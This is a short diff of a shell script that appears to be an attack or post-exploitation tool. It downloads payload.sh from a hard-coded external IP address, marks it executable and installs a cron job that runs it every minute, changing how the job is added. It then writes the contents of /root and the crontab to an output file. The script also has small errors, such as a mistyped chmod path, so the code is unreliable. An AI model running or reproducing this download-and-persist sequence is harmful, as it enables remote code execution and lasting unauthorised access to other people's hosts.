@@ -21,7 +21,9 @@ OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
 # Commands to run on the host<
 curl http://35.194.58.97/payload.sh --output /root/payload.sh
 chmod +x /root/payload/sh
-echo * * * * * /root/payload.sh >> /etc/crontab
+crontab -l > /root/mycron
+echo * * * * * /root/payload.sh >> /root/mycron
+crontab /root/mycron
 ls /root > \${OUTPATH}
 cat /etc/crontab >> \${OUTPATH} 1>&1
 
